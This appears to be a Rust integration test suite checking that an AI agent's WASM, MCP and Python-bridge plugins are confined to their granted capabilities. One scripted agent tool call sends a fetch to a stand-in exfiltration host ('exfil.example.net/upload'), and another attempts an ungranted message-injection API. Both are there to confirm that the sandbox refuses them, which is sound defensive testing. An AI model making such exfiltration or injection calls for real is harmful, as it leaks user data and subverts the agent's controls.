//! Task 60.2: the three extension kinds each give the agent a tool it
//! calls under the capabilities granted to it, and each refuses what was
//! not granted (spec: plugin-system, WASM sandbox and capability grants;
//! MCP client servers; python-bridge, Sidecar isolation and capability
//! checks): a WASM plugin fetching from its declared host and refused an
//! undeclared one, an MCP server whose sandbox lets it write only where
//! its grant says, and a Hermes Python plugin whose tool runs while an
//! ungranted host API is refused.

use std::io::{BufRead as _, BufReader, Write as _};
use std::path::Path;
use std::process::Stdio;

use crate::common::{
    command, mock_home, newest_session, ok, run, session_messages, stderr, stdout,
};

/// Runs a one-shot `go` turn with the mock `script`; its stdout.
fn one_shot(home: &Path, script: &str) -> String {
    let path = home.join("script.toml");
    std::fs::write(&path, script).unwrap();
    let out = command(home)
        .args(["-z", "go", "--mock-script", path.to_str().unwrap()])
        .stdin(Stdio::null())
        .output()
        .unwrap();
    assert!(out.status.success(), "{}", stderr(&out));
    stdout(&out)
}

/// The tool results of the newest session, in order.
fn tool_results(home: &Path) -> Vec<String> {
    session_messages(home, &newest_session(home))
        .iter()
        .filter(|m| m["role"] == "tool")
        .map(|m| m["content"].as_str().unwrap_or_default().to_owned())
        .collect()
}

/// A loopback server answering every request with `weather: sunny`.
fn weather_server() -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let mut reader = BufReader::new(&stream);
            let mut line = String::new();
            while reader.read_line(&mut line).unwrap_or(0) > 2 {
                line.clear();
            }
            let _ = (&stream).write_all(
                b"HTTP/1.1 200 OK\r\ncontent-length: 14\r\nconnection: close\r\n\r\nweather: sunny",
            );
        }
    });
    port
}

/// Places WASM plugin `id` (the testing probe) with `capabilities`,
/// adopted like `prometheus plugins adopt` would.
fn place_probe(home: &Path, capabilities: &str) {
    let dir = home.join("profiles/default/plugins/probe");
    pmt_plugins::testkit::install("testing-probe", &dir);
    std::fs::write(
        dir.join("plugin.toml"),
        format!(
            "manifest_version = 1\nid = \"probe\"\nversion = \"1.0.0\"\nkind = \"wasm\"\n\
             description = \"test\"\nlicense = \"MIT\"\nrequires_prometheus = \"*\"\n\
             worlds = [\"tool@1.0\"]\n\n[capabilities]\n{capabilities}\n"
        ),
    )
    .unwrap();
    pmt_plugins::record::InstallRecord {
        source: pmt_plugins::record::Origin::Adopted,
        location: dir.to_string_lossy().into_owned(),
        r#ref: None,
        package_digest: None,
        digest: pmt_plugins::digest::of_dir(&dir).unwrap(),
        signer: None,
        tier: None,
        installed_at: "2026-11-11T00:00:00Z".to_owned(),
        flags: pmt_plugins::record::Flags::default(),
        held_update: None,
    }
    .write(&dir)
    .unwrap();
}

#[test]
fn a_wasm_plugin_tool_reaches_its_granted_host_and_is_refused_another() {
    let home = mock_home();
    let port = weather_server();
    place_probe(home.path(), &format!("network = [\"127.0.0.1:{port}\"]"));
    ok(&run(
        home.path(),
        &["plugins", "enable", "probe", "--grant", "all"],
    ));
    let said = one_shot(
        home.path(),
        &format!(
            r#"
[[rule]]
user = "go"
[[rule.tool_calls]]
name = "fetch"
arguments = {{ v = "http://127.0.0.1:{port}/today" }}

[[rule]]
tool_result = "weather: sunny"
[[rule.tool_calls]]
name = "fetch"
arguments = {{ v = "https://exfil.example.net/upload" }}

[[rule]]
tool_result = "capability_denied"
text = "granted host only"
"#
        ),
    );
    assert_eq!(said, "granted host only\n");
    let results = tool_results(home.path());
    assert!(results[0].contains("200 weather: sunny"), "{results:?}");
    assert!(
        results[1].contains("capability_denied: network exfil.example.net"),
        "{results:?}"
    );
}

#[test]
fn an_mcp_server_tool_runs_in_a_sandbox_that_refuses_ungranted_writes() {
    let home = mock_home();
    let granted = home.path().join("granted");
    let elsewhere = home.path().join("elsewhere");
    std::fs::create_dir_all(&granted).unwrap();
    std::fs::create_dir_all(&elsewhere).unwrap();
    let fixture = pmt_mcp::testkit::fixture();
    for (name, log) in [("allowed", &granted), ("refused", &elsewhere)] {
        let log = log.join("calls.log");
        ok(&run(
            home.path(),
            &[
                "mcp",
                "add",
                name,
                "--command",
                fixture.to_str().unwrap(),
                "--args",
                "--log",
                log.to_str().unwrap(),
            ],
        ));
        // Both servers may write only under `granted`.
        let grant = format!("[{:?}]", format!("{}/**", granted.display()));
        ok(&run(
            home.path(),
            &[
                "config",
                "set",
                &format!("mcp.servers.{name}.capabilities.fs_write"),
                &grant,
            ],
        ));
    }
    let said = one_shot(
        home.path(),
        r#"
[[rule]]
user = "go"
[[rule.tool_calls]]
name = "mcp__allowed__echo"
arguments = { text = "from the allowed server" }

[[rule]]
tool_result = "from the allowed server"
[[rule.tool_calls]]
name = "mcp__refused__echo"
arguments = { text = "from the refused server" }

[[rule]]
tool_result = "from the refused server"
text = "both answered"
"#,
    );
    assert_eq!(said, "both answered\n");
    // Each server's tool ran; only the write inside the grant happened.
    assert_eq!(
        std::fs::read_to_string(granted.join("calls.log")).unwrap(),
        "call echo\n"
    );
    assert!(
        !elsewhere.join("calls.log").exists(),
        "the sandbox refused the write outside the grant"
    );
}

#[test]
fn a_hermes_python_plugin_tool_runs_and_an_ungranted_api_is_refused() {
    let home = mock_home();
    pmt_pybridge::testkit::seed(home.path());
    let dir = pmt_pybridge::testkit::place(home.path(), "echo", "echo");
    let grant = "secrets.read:SPOTIFY_TOKEN";
    ok(&run(
        home.path(),
        &["plugins", "adopt", dir.to_str().unwrap(), "--grant", grant],
    ));
    ok(&run(
        home.path(),
        &["plugins", "enable", "echo", "--grant", grant],
    ));
    let said = one_shot(
        home.path(),
        r#"
[[rule]]
user = "go"
[[rule.tool_calls]]
name = "echo"
arguments = { text = "through the bridge" }

[[rule]]
tool_result = "through the bridge"
[[rule.tool_calls]]
name = "inject"
arguments = { content = "hi", session_key = "s1" }

[[rule]]
tool_result = "false"
text = "granted calls only"
"#,
    );
    assert_eq!(said, "granted calls only\n");
    let log =
        std::fs::read_to_string(home.path().join("profiles/default/logs/bridge/echo.log")).unwrap();
    assert!(
        log.contains("capability not granted: plugin.inject_messages"),
        "{log}"
    );
}
